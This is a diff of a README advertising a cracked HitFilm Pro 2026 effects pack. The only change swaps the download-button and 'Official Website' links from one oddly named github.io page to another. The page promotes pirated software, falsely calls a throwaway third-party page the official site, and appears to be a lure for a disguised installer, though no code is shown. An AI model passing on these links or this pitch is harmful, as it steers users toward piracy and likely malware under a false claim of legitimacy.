@@ -2,7 +2,7 @@
 
 This package offers a complete enhancement toolkit for HitFilm Pro, specifically the 2026 version, including a cracked effects pack with additional plugins and templates. It is ideal for video editors looking to expand their creative possibilities with professional-grade tools.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -47,6 +47,6 @@ A: This version is provided for educational and testing purposes. While it inclu
 ## Download
 
 To get started, download the effects pack using the button above or visit the direct link below:
-[Download from Official Website](https://yellowtaxisave.github.io/download-page/)
+[Download from Official Website](https://capitals-707-bringing.github.io/download-page/)
 
 This package is a valuable resource for enhancing your video editing projects with HitFilm Pro. Unleash your creativity with professional tools and effects!
